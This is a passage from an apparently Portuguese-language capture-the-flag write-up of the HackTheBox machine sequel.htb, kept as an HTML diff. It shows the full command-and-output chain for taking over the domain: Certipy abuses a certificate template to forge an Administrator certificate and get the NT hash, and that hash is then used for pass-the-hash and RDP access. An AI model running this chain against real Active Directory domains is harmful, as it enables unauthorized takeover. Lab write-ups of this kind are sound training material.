+[*] NT hash <span class="hljs-keyword">for</span> <span class="hljs-string">'ca_svc'</span>: <span class="hljs-number">3</span>b181b914e7a9d5508ea1e20bc2b7fce
+
+root<span class="hljs-symbol">@kali</span>:~<span class="hljs-meta"># KRB5CCNAME=$PWD/ca_svc.ccache certipy template  -k -template DunderMifflinAuthentication  -target dc01.sequel.htb -dc-ip 10.10.11.51</span>
+Certipy v4<span class="hljs-number">.8</span><span class="hljs-number">.2</span> - by Oliver Lyak (ly4k)
+
+[*] Updating certificate template <span class="hljs-string">'DunderMifflinAuthentication'</span>
+[*] Successfully updated <span class="hljs-string">'DunderMifflinAuthentication'</span>
+
+root<span class="hljs-symbol">@kali</span>:~<span class="hljs-meta"># certipy req -u ca_svc -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -ca sequel-DC01-CA -target dc01.sequel.htb -dc-ip 10.10.11.51 -template DunderMifflinAuthentication -upn Administrator@sequel.htb -ns 10.10.11.51 -dns 10.10.11.51</span>
+Certipy v4<span class="hljs-number">.8</span><span class="hljs-number">.2</span> - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Successfully requested certificate
+[*] Request ID is <span class="hljs-number">9</span>
+[*] Got certificate <span class="hljs-keyword">with</span> multiple identifications
+UPN: <span class="hljs-string">'Administrator@sequel.htb'</span>
+DNS Host Name: <span class="hljs-string">'10.10.11.51'</span>
+[*] Certificate has no object SID
+[*] Saved certificate <span class="hljs-literal">and</span> private key <span class="hljs-keyword">to</span> <span class="hljs-string">'administrator_10.pfx'</span>
+</code></pre>
+<p>Agora, podemos nos autenticar no servidor usando o novo certificado.</p>
+<pre><code class="lang-bash">root<span class="hljs-symbol">@kali</span>:~<span class="hljs-meta"># certipy auth -pfx administrator_10.pfx -dc-ip 10.10.11.51</span>
+root<span class="hljs-symbol">@kali</span>:~<span class="hljs-meta"># Certipy v4.8.2 - by Oliver Lyak (ly4k)</span>
+
+[*] Found multiple identifications <span class="hljs-keyword">in</span> certificate
+[*] Please <span class="hljs-keyword">select</span> one:
+[<span class="hljs-number">0</span>] UPN: <span class="hljs-string">'Administrator@sequel.htb'</span>
+[<span class="hljs-number">1</span>] DNS Host Name: <span class="hljs-string">'10.10.11.51'</span>
+
+[*] Using principal: administrator<span class="hljs-symbol">@sequel</span>.htb
+[*] Trying <span class="hljs-keyword">to</span> get TGT...
+[*] Got TGT
+[*] Saved credential cache <span class="hljs-keyword">to</span> <span class="hljs-string">'administrator.ccache'</span>
+[*] Trying <span class="hljs-keyword">to</span> retrieve NT hash <span class="hljs-keyword">for</span> <span class="hljs-string">'administrator'</span>
+[*] Got hash <span class="hljs-keyword">for</span> <span class="hljs-string">'administrator@sequel.htb'</span>: aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">7</span>a8d4e04986afa8ed4060f75e5a0b3ff
+</code></pre>
+<p>Agora temos a hash do administrador, vamos usar <a href="https://www.crowdstrike.com/en-us/cybersecurity-101/cyberattacks/pass-the-hash-attack/"><code>pass-the-hash</code></a> e
+habilitar o <a href="https://en.wikipedia.org/wiki/Remote_Desktop_Protocol"><code>RDP</code></a> para nos conectarmos e termos domínio completo.</p>
+<pre><code class="lang-bash"><span class="hljs-symbol">root@kali:</span>~# netexec smb <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span> -u administrator -H <span class="hljs-string">"7a8d4e04986afa8ed4060f75e5a0b3ff"</span> -M rdp -o ACTION=enable                            
+SMB         <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span>     <span class="hljs-number">445</span>    DC01             [*] Windows <span class="hljs-number">10</span> / Server <span class="hljs-number">2019</span> Build <span class="hljs-number">17763</span> x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
+SMB         <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span>     <span class="hljs-number">445</span>    DC01             [+] sequel.htb\administrator:7a8d4e04986afa8ed4060f75e5a0b3ff (Pwn3d!)
+RDP         <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span>     <span class="hljs-number">445</span>    DC01             [+] Enable RDP via WMI(ncacn_ip_tcp) successfully
+
+RDP         <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span>     <span class="hljs-number">445</span>    DC01             [+] RDP Port: <span class="hljs-number">3389</span>
+<span class="hljs-symbol">
+root@kali:</span>~# xfreerdp3 /u:administrator /pth:<span class="hljs-string">'7a8d4e04986afa8ed4060f75e5a0b3ff'</span> /d:sequel.htb /v:<span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span>
+</code></pre>
+<p>E conseguimos agora, ter controle total sobre o <code>ActiveDirectory</code>.</p>
+<p><img src="../../static/rdp.png" alt="map"></p>
+<p><img src="../../static/users-in-rdp.png" alt="map"></p>
